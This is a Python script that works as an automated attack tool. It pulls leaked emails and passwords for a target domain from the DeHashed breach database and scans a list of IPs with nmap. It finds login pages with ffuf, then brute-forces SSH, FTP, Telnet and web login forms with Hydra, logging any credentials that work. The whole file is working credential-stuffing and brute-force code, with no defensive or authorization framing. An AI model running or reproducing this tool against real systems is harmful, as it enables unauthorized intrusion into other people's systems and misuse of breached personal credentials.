#!/usr/bin/env python3

import requests
import subprocess
import os
import argparse
import logging
import json
from time import sleep

def parse_args():
    parser = argparse.ArgumentParser(
        description="Automated tool for leaked credentials search, open port scan, and brute-force attempts."
    )
    parser.add_argument("-d", "--domain", required=True, help="Domain to search in DeHashed")
    parser.add_argument("-k", "--apikey", required=True, help="DeHashed API v2 key")
    parser.add_argument("-ipfile", "--ipfile", required=True, help="File with list of IPs to scan")
    parser.add_argument("-v", "--verbose", action="store_true", help="Print verbose output")
    return parser.parse_args()

# Log configuration
logging.basicConfig(level=logging.INFO)

# File paths
USERNAME_FILE = "usernames.txt"
PASSWORD_FILE = "passwords.txt"
UNSUCCESSFUL_LOG = "login_attempts.txt"
SUCCESSFUL_LOG = "successful_logins.txt"

def query_dehashed(domain, api_key, verbose=False):
    entries = []
    page = 1
    per_page = 10000
    api_url = "https://api.dehashed.com/v2/search"

    while True:
        payload = {
            "query": f"domain:{domain}",
            "page": page,
            "size": per_page
        }
        headers = {
            "Dehashed-Api-Key": api_key,
            "Content-Type": "application/json",
            "Accept": "application/json"
        }

        if verbose:
            print(f"[+] POST {api_url} | page {page} | size {per_page}")
            print(f"    Payload: {payload}")

        resp = requests.post(api_url, json=payload, headers=headers)

        if verbose:
            print(f"    → {resp.status_code} {resp.reason}")
            print(f"    Body preview: {resp.text[:200]}…")

        if resp.status_code == 401:
            logging.error("Authentication failed (401). Check your API key and subscription.")
            break
        if resp.status_code == 404:
            logging.error("Search endpoint not found (404). Verify subscription & endpoint URL.")
            break
        if resp.status_code != 200:
            logging.error(f"Unexpected HTTP {resp.status_code}: {resp.text}")
            break

        data = resp.json()
        page_entries = data.get("entries", [])
        if not page_entries:
            if verbose:
                print("[*] No more entries, stopping pagination.")
            break

        entries.extend(page_entries)

        if len(page_entries) < per_page:
            break

        page += 1
        sleep(0.2)

    print(f"Total entries fetched: {len(entries)}")
    return entries

def save_credentials(entries):
    users = set()
    passwords = set()

    for entry in entries:
        for mail in entry.get("email", []):
            local = mail.split("@")[0]
            users.add(local)
        for pwd in entry.get("password", []):
            passwords.add(pwd)

    with open(USERNAME_FILE, "w") as uf:
        uf.write("\n".join(sorted(users)))
    with open(PASSWORD_FILE, "w") as pf:
        pf.write("\n".join(sorted(passwords)))

    print(f"Saved {len(users)} usernames and {len(passwords)} passwords.")

def log_unsuccessful_attempt(ip, port, service):
    with open(UNSUCCESSFUL_LOG, "a") as f:
        f.write(f"Port {port} on {ip} - {service}: Logins unsuccessful\n")

def log_successful_login(ip, port, service, username, password):
    with open(SUCCESSFUL_LOG, "a") as f:
        f.write(f"Port {port} on {ip} - {service}: Successful login with {username}/{password}\n")

def scan_open_ports(ip):
    print(f"Scanning {ip} for open ports...")
    result = subprocess.run(
        ["nmap", "-p22,21,23,80,443,8080,8443,10443", "--open", "-Pn", ip],
        capture_output=True, text=True
    )
    return result.stdout

def parse_nmap_result(output):
    services = {"http": [], "ssh": False, "ftp": False, "telnet": False}
    for line in output.splitlines():
        if "22/tcp open" in line:
            services["ssh"] = True
        elif "21/tcp open" in line:
            services["ftp"] = True
        elif "23/tcp open" in line:
            services["telnet"] = True
        elif any(p in line for p in ["80/tcp open", "443/tcp open", "8080/tcp open", "8443/tcp open", "10443/tcp open"]):
            services["http"].append(line.split("/")[0])
    return services

def scan_for_login_pages(ip, port):
    protocol = "https" if port in ["443", "8443", "10443"] else "http"
    cmd = [
        "ffuf", "-u", f"{protocol}://{ip}:{port}/FUZZ", "-w", "common.txt",
        "-mr", "login", "-o", f"ffuf_{ip}_{port}.json", "-t", "50", "-k"
    ]
    print(f"Scanning {ip}:{port} for login pages...")
    subprocess.run(cmd)

    path = f"ffuf_{ip}_{port}.json"
    if os.path.exists(path):
        with open(path) as f:
            return any("login" in line for line in f)
    return False

def run_hydra(ip, service, port):
    if service == "http":
        prot = "https" if port in ["443", "8443", "10443"] else "http"
        cmd = [
            "hydra", "-L", USERNAME_FILE, "-P", PASSWORD_FILE,
            f"{prot}-post-form", f"{ip}:{port}:/login.php:username=^USER^&password=^PASS^:Invalid credentials",
            "-I", "-t", "4", "-vV"
        ]
    else:
        cmd = ["hydra", "-L", USERNAME_FILE, "-P", PASSWORD_FILE, service, ip]

    print(f"Running Hydra against {service} on {ip}:{port}...")
    res = subprocess.run(cmd, capture_output=True, text=True)
    if "login:" in res.stdout and "password:" in res.stdout:
        user = res.stdout.split("login: ")[1].split(" password:")[0]
        pwd  = res.stdout.split("password: ")[1].split("\n")[0]
        log_successful_login(ip, port, service, user, pwd)
    else:
        log_unsuccessful_attempt(ip, port, service)

def main():
    args = parse_args()

    entries = query_dehashed(args.domain, args.apikey, args.verbose)
    if not entries:
        print("No entries found for the domain.")
        return

    save_credentials(entries)

    with open(args.ipfile) as f:
        ips = [line.strip() for line in f if line.strip()]

    for ip in ips:
        nmap_out = scan_open_ports(ip)
        svcs = parse_nmap_result(nmap_out)

        for port in svcs["http"]:
            if scan_for_login_pages(ip, port):
                run_hydra(ip, "http", port)

        for svc, open_ in svcs.items():
            if svc != "http" and open_:
                run_hydra(ip, svc, "")

    print("process Finished")

if __name__ == "__main__":
    main()
